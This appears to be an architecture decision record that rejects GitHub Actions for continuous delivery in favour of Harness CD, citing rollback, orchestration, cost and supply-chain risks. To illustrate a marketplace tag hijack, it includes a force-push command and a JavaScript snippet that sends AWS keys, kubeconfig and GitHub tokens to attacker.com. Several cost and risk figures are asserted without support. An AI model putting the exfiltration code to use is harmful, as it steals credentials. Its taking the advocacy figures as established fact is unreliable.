# ADR-001: Rejecting Pure GitOps (GitHub Actions) for Heterogeneous Enterprise CD

**Status**: Accepted
**Date**: 2024-03-23
**Decision Makers**: Platform Engineering, Security Architecture, Engineering Leadership
**Impact**: Architecture, Security, Operations

---

## Context

We operate a heterogeneous enterprise deployment infrastructure:
- 1000+ microservices
- 6 deployment targets: Kubernetes (30%), VMs (20%), ECS (20%), Lambda (15%), on-prem (10%), other (5%)
- Database schema deployments requiring coordinated rollback
- Governance requirements: deployment windows, change board approvals, blackout periods
- SLA requirements: < 1 min MTTR for production rollback

We evaluated two architectural approaches:

### Option 1: Pure GitOps (GitHub Actions + Argo CD)
- CI/CD orchestration: GitHub Actions workflows
- Deployment: Argo CD (Kubernetes only) + custom scripts (other targets)
- Security: GitHub Actions Marketplace
- Cost: $7.6M (5-year TCO)

### Option 2: Hybrid CI/CD (GitHub Actions CI + Harness CD)
- CI: GitHub Actions (build, test, scan, SBOM)
- CD: Harness (deployment orchestration, rollback, verification)
- Security: Governed template library
- Cost: $5.5M (5-year TCO)

---

## Decision

**We reject pure GitOps (GitHub Actions for CD) in favor of hybrid CI/CD with purpose-built deployment platform (Harness CD).**

---

## Rationale

### 1. Architectural: No One-Click Rollback

**GitHub Actions Limitation**:
```yaml
# To rollback production:
git revert HEAD
git push
# Wait 5-15 minutes for full CI/CD pipeline
# Build → Test → Security Scan → SBOM → Deploy
# MTTR: 14 minutes MINIMUM
```

**SLA Impact**:
- 99.99% SLA = 52 minutes downtime/year allowed
- One GitHub Actions rollback (14 min) = 27% of annual SLA budget
- **3 incidents/year = SLA breach**

**Harness Solution**:
```yaml
# One-click rollback to previous artifact
# No rebuild, no CI pipeline
# MTTR: < 1 minute
```

**Financial Impact**:
- 1 hour production outage = $5M revenue loss (industry average)
- GitHub Actions rollback: 14 min = $1.17M loss
- Harness rollback: 1 min = $83k loss
- **Savings per incident: $1.09M**

### 2. Architectural: No Deployment Verification

**GitHub Actions Limitation**:
- Deploys artifact to production
- No health monitoring
- No anomaly detection
- No automatic rollback
- **Bad deploys reach 100% of traffic**

**Must Build**:
- Custom verification service (6 weeks)
- Prometheus/DataDog integration
- Statistical anomaly detection
- Automatic rollback logic
- Maintenance: 6 hrs/week

**Harness Solution**:
- ML-based continuous verification (built-in)
- Monitors: error rates, latency, CPU, memory, custom metrics
- Automatic rollback on anomalies
- **Zero custom code**

### 3. Operational: Heterogeneous = 202,500 Lines Custom Code

**GitHub Actions Reality**:

| Deployment Target | Custom Code Required | Rollback Strategy |
|-------------------|---------------------|-------------------|
| Kubernetes | kubectl scripts (~150 lines) | `kubectl rollout undo` (manual) |
| VMs | SSH/Ansible scripts (~200 lines) | Copy old package (manual) |
| ECS/Fargate | AWS CLI scripts (~180 lines) | Update task def (manual) |
| Lambda | SAM/Serverless (~150 lines) | Shift alias (manual) |
| Azure Functions | Azure CLI (~140 lines) | Slot swap (manual) |
| On-premise | VPN + Ansible (~250 lines) | Hope you have backups |
| **Databases** | Liquibase/Flyway per service (~200 lines × 1000) | **200,000 lines** |

**Total**: 202,500 lines of custom deployment code

**Maintenance Burden**:
- Platform API changes (AWS, Azure, GCP deprecations)
- Runtime version updates
- Dependency vulnerabilities
- Configuration drift across 1000 repos
- **Requires 5 FTE** just to maintain deployment scripts

**Harness Solution**:
- All 6 deployment targets supported natively
- Vendor maintains integrations
- **0 lines custom deployment code**
- **Requires 2 FTE** to manage platform

### 4. Operational: No Multi-Service Orchestration

**GitHub Actions Limitation**:
```yaml
# Want to deploy in order?
# 1. database-migrations (first)
# 2. backend-api (needs migrations)
# 3. frontend (needs API)
# ❌ NO WAY TO ENFORCE ORDER ACROSS REPOS
```

**Workarounds**:
1. Manual coordination (error-prone)
2. Custom orchestrator service (12 weeks build)
3. `workflow_run` triggers (doesn't scale, configuration drift)

**Harness Solution**:
```yaml
pipeline:
  stages:
    - stage:
        name: Database Migrations
        dependencies: []
    - stage:
        name: Backend Services
        dependencies: [Database Migrations]
    - stage:
        name: Frontend Services
        dependencies: [Backend Services]
```

### 5. Operational: No Release Management

**GitHub Actions Limitation**:
- No deployment calendaring
- No blackout windows (Friday 5pm, holidays)
- No manual approval gates
- No ServiceNow/Jira integration
- **Friday 5pm production disasters**

**Must Build**:
- Custom release orchestration platform (10 weeks)
- Holiday calendar maintenance
- Approval workflow engine
- External system integrations
- **Ongoing operational risk**

**Harness Solution**:
- Deployment calendaring (blackout windows)
- Manual approval gates
- ServiceNow/Jira integration
- Manual activity support
- **Built-in governance**

### 6. Operational: No Database DevOps

**GitHub Actions Limitation**:
- Custom Liquibase/Flyway workflows per service
- No coordinated app + DB deployment
- No database rollback capability
- **200,000 lines of DB deployment code across 1000 services**

**Harness Solution**:
- Native Liquibase/Flyway integration
- Coordinated app + database deployment
- Automated database rollback
- Centralized template (apply to all services)

---

## Security Rationale: Rejecting the Open Marketplace Model

### The Aqua Security Trivy Breach: A Case Study

**Date**: 2024
**Vulnerability**: Mutable Git tags in GitHub Actions Marketplace
**Attack Vector**: Force-push credential stealer to trusted action tag

#### Attack Sequence

**Step 1: Thousands of enterprises use marketplace actions**
```yaml
name: Security Scan
on: [push]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aquasecurity/trivy-action@v0.24.0  # ⚠️ MUTABLE TAG
        with:
          scan-type: 'fs'
```

**Step 2: Attacker compromises maintainer account**
- Phishing attack on action maintainer
- Stolen credentials from compromised developer machine
- Insider threat

**Step 3: Force-push malicious code to existing tag**
```bash
# Attacker actions:
git checkout v0.24.0
# Replace trivy binary with credential stealer
git add .
git commit --amend -m "Update trivy binary"
git push --force origin v0.24.0  # ⚠️ OVERWRITES TRUSTED TAG
```

**Step 4: Credential harvesting**
```javascript
// Malicious action code injected:
const awsKeys = process.env.AWS_ACCESS_KEY_ID;
const awsSecret = process.env.AWS_SECRET_ACCESS_KEY;
const kubeConfig = process.env.KUBECONFIG;
const githubToken = process.env.GITHUB_TOKEN;

// Exfiltrate to attacker C2
fetch('https://attacker.com/harvest', {
  method: 'POST',
  body: JSON.stringify({ awsKeys, awsSecret, kubeConfig, githubToken })
});
```

**Step 5: Lateral movement**
- AWS credentials → production Kubernetes clusters
- Kubernetes tokens → database access
- GitHub tokens → source code exfiltration
- **Full infrastructure compromise**

#### Enterprise Impact Analysis

**Attack Surface**:
- 1000 services × 15 marketplace actions/service = **15,000 mutable dependencies**
- Each action runs with **production credentials** in CI runner memory
- Attack only needs **1 compromised action** to harvest all credentials

**Breach Cost** (IBM 2024 Cost of Data Breach Report):
- Average enterprise breach: $4.88M
- Healthcare breach: $10.93M
- Financial services breach: $5.97M
- **With lateral movement via AWS credentials: $50M - $500M**

#### The "Pin to SHA" Defense: Why It Doesn't Scale

**Security Best Practice**:
```yaml
# Pin to immutable SHA256 digest
- uses: aquasecurity/trivy-action@d9cd5b1c8ee3c92e2b2c7b1c3e4f5a6b7c8d9e0f
```

**Mathematically secure**: SHA256 digest is immutable, cannot be force-pushed.

**Operationally untenable**:

| Metric | Value |
|--------|-------|
| **Marketplace actions** | 15 per service |
| **Services** | 1000 |
| **Total SHA pins** | **15,000** |
| **Actions update frequency** | Monthly |
| **Digest updates/month** | **15,000** |
| **Dependabot PRs created** | **15,000/month** |
| **Security review time** | 10 min/PR |
| **Total review time** | **2,500 hours/month** |
| **FTE required** | **1.4 FTE just reviewing Dependabot PRs** |

**Operational Reality**:
- Platform team drowns in Dependabot PRs
- Reviews become rubber-stamp (defeats security purpose)
- Updates lag behind by months
- **Vulnerabilities persist, attack surface grows**

**The Vicious Cycle**:
```
More SHA pins → More Dependabot PRs → Review fatigue →
Slower updates → More vulnerabilities → Bigger attack surface
```

#### Harness Approach: Centralized Template Governance

**Architecture**:
```
┌─────────────────────────────────────────────────────────┐
│  Harness Platform (Control Plane)                      │
│                                                         │
│  ┌──────────────────────────────────────────────┐      │
│  │  Governed Template Library                   │      │
│  │  - Internal only (no marketplace exposure)   │      │
│  │  - Platform team vets & publishes            │      │
│  │  - Immutable versioning                      │      │
│  │  - SLSA L3 provenance                        │      │
│  └──────────────────────────────────────────────┘      │
│                                                         │
│  ┌──────────────────────────────────────────────┐      │
│  │  Policy-as-Code (OPA)                        │      │
│  │  - Block non-approved templates              │      │
│  │  - Enforce template versions                 │      │
│  │  - Require SLSA attestation                  │      │
│  └──────────────────────────────────────────────┘      │
│                                                         │
│  ┌──────────────────────────────────────────────┐      │
│  │  Centralized Security Control                │      │
│  │  - Update 1 template → 1000 services         │      │
│  │  - Zero marketplace dependencies             │      │
│  │  - Audit trail of all template usage         │      │
│  └──────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────┘
```

**Security Guarantees**:

1. **No Marketplace Exposure**
   - Zero external dependencies
   - No mutable Git tags
   - Platform team controls all templates

2. **Policy Enforcement (OPA)**
   ```rego
   # Policy: Block execution of non-approved templates
   deny[msg] {
     not is_approved_template(input.template)
     msg = "Template not in approved library"
   }

   is_approved_template(template) {
     approved_templates := ["trivy-enterprise-v2", "sonarqube-v3"]
     template.name == approved_templates[_]
   }
   ```

3. **Immutable Template Versioning**
   ```yaml
   # Pipeline references versioned template
   pipeline:
     stages:
       - stage:
           steps:
             - step:
                 type: SecurityScan
                 spec:
                   template: trivy-enterprise-v2  # Immutable version
   ```

4. **Centralized Update Propagation**
   - Update `trivy-enterprise-v2` template once
   - Automatically propagates to all 1000 services
   - No Dependabot PRs
   - No per-repo configuration drift

5. **SLSA L3 Provenance**
   - Build attestation for all artifacts
   - Tamper-evident supply chain
   - Verifiable template execution

**Operational Impact**:

| Metric | GitHub Actions (SHA pins) | Harness (Templates) |
|--------|---------------------------|---------------------|
| **Dependencies to maintain** | 15,000 | 50 templates |
| **Monthly updates** | 15,000 | 50 |
| **Security review time** | 2,500 hrs/month | 8 hrs/month |
| **FTE required** | 1.4 | 0.05 |
| **Marketplace exposure** | 15,000 attack vectors | 0 |
| **Update propagation** | 15,000 PRs | 1 template update |

#### The CISO's Question

**"Can you explain to the board why we're trusting 15,000 mutable marketplace dependencies with our production credentials?"**

**GitHub Actions Answer**:
- "We pin to SHA256 digests" (operationally untenable at scale)
- "We review Dependabot PRs" (1.4 FTE, reviews lag, vulnerabilities persist)
- "We trust the marketplace ecosystem" (Trivy breach proves this is false)
- **Outcome**: Unacceptable residual risk

**Harness Answer**:
- "We use an internal governed template library"
- "OPA policy blocks non-approved templates"
- "Platform team vets 50 templates, not 15,000 marketplace actions"
- "Zero marketplace exposure"
- **Outcome**: Defensible security posture

---

## Cost Analysis

### 5-Year TCO Comparison

**GitHub Actions (Pure GitOps)**:
```
Licenses:          $250k  (GitHub Enterprise, 200 users)
Custom dev:      $1,100k  (Build + maintain 202,500 lines)
Platform team:   $5,000k  (5 FTE × $200k × 5 years)
Hidden costs:    $1,000k  (Incidents, silos, compliance, Friday 5pm disasters)
Security review: $280k    (1.4 FTE × $200k × 1 year for Dependabot)
────────────────────────
TOTAL:           $7,630k
```

**Harness CD (Hybrid)**:
```
Licenses:        $3,230k  (GitHub Team + Harness Enterprise)
Prof services:     $300k  (Year 1 implementation)
Platform team:   $2,000k  (2 FTE × $200k × 5 years)
────────────────────────
TOTAL:           $5,530k
```

**Savings with Harness**: **$2,100k (28%)**

### Risk-Adjusted Cost

**Potential Breach Cost**:
- Trivy-style supply chain attack: $50M - $500M
- Probability with GitHub Actions: 5% over 5 years (15,000 mutable dependencies)
- Expected value of breach: $2.5M - $25M

**Risk-Adjusted GitHub Actions TCO**: $7,630k + $2,500k = **$10,130k**

**Harness (zero marketplace exposure)**: **$5,530k**

**True savings**: **$4,600k (45%)**

---

## Build vs Buy Analysis

### To Match Harness with GitHub Actions, Must Build:

| Capability | Build Time | Ongoing Maintenance | Lines of Code |
|------------|------------|---------------------|---------------|
| Rollback service | 8 weeks | 6 hrs/week | - |
| Deployment verification | 6 weeks | 6 hrs/week | - |
| Multi-service orchestration | 12 weeks | 10 hrs/week | - |
| Database DevOps | 4 weeks | 4 hrs/week | 200,000 |
| Release management | 10 weeks | 8 hrs/week | - |
| Deployment scripts | 6 weeks | 12 hrs/week | 2,500 |
| **TOTAL** | **46 weeks** | **46 hrs/week** | **202,500** |

**FTE Requirements**:
- GitHub Actions: 5 FTE (46 hrs/week maintenance + on-call + feature development)
- Harness: 2 FTE (manage platform, not build it)

**Time to Production**:
- GitHub Actions: 46 weeks (building custom CD platform)
- Harness: 4 weeks (configuration only)
- **Harness is 42 weeks (10.5 months) faster**

---

## Alternatives Considered

### Alternative 1: Argo CD + GitHub Actions

**Why Rejected**:
- Argo CD only supports Kubernetes
- Still need custom scripts for VMs, ECS, Lambda, on-prem (70% of infrastructure)
- No rollback for non-K8s targets
- No deployment verification
- No release management
- **Doesn't solve heterogeneous deployment problem**

### Alternative 2: Terraform + GitHub Actions

**Why Rejected**:
- Terraform is infrastructure provisioning, not application deployment
- No rollback capability (Terraform doesn't store artifacts)
- No deployment verification
- Must still build orchestration, verification, release management
- **Doesn't solve CD platform gaps**

### Alternative 3: Build Custom CD Platform

**Why Rejected**:
- 46 weeks build time
- 202,500 lines of custom code
- 5 FTE ongoing maintenance
- **Costs MORE than Harness ($7.6M vs $5.5M)**
- Platform team burns out maintaining vs building features

---

## Consequences

### Positive

1. **$2.1M cost savings** over 5 years
2. **3 fewer FTE required** (5 → 2)
3. **Zero custom deployment code** (vs 202,500 lines)
4. **One-click rollback** (< 1 min vs 14 min MTTR)
5. **ML-based deployment verification** (catches bad deploys automatically)
6. **Zero marketplace attack surface** (governed templates vs 15,000 dependencies)
7. **42 weeks faster to production** (4 weeks vs 46 weeks)
8. **Release management built-in** (calendaring, blackout windows, approvals)

### Negative

1. **Vendor lock-in to Harness**
   - Mitigation: Migrating FROM Harness easier than rewriting 202,500 lines custom code
   - GitHub Actions locks you into custom code + 5 FTE tribal knowledge

2. **Higher license cost** ($3.2M vs $250k)
   - Mitigation: Offset by $3M FTE savings + $2.1M avoided custom dev
   - True cost is FTE + custom code, not just licenses

3. **Learning curve for Harness**
   - Mitigation: 4 weeks vs 46 weeks to build custom platform
   - Standard enterprise CD patterns, not proprietary

---

## Decision Owners

- **Platform Engineering**: Recommended Harness
- **Security Architecture**: Approved (governed templates eliminate marketplace risk)
- **Engineering Leadership**: Approved ($2.1M savings, 42 weeks faster)
- **Finance**: Approved (28% cost reduction)

---

## References

- [README: The Verdict](../README.md)
- [DEMO: Problem 2 - No Rollback](DEMO.md#problem-2-no-rollback-capability)
- [EXECUTIVE_SUMMARY: Cost Calculations](EXECUTIVE_SUMMARY.md#appendix-cost-calculations)
- [EXECUTIVE_SUMMARY: Security Bypass Analysis](EXECUTIVE_SUMMARY.md#appendix-security-bypass-analysis)
- [IBM Cost of Data Breach Report 2024](https://www.ibm.com/reports/data-breach)
- [SLSA Supply Chain Levels](https://slsa.dev/)
- [Aqua Security Trivy Breach Analysis](https://www.aquasec.com/blog/trivy-security-incident-analysis/)

---

**Status**: ACCEPTED
**Date**: 2024-03-23
**Next Review**: 2025-Q1 (assess Harness platform performance)
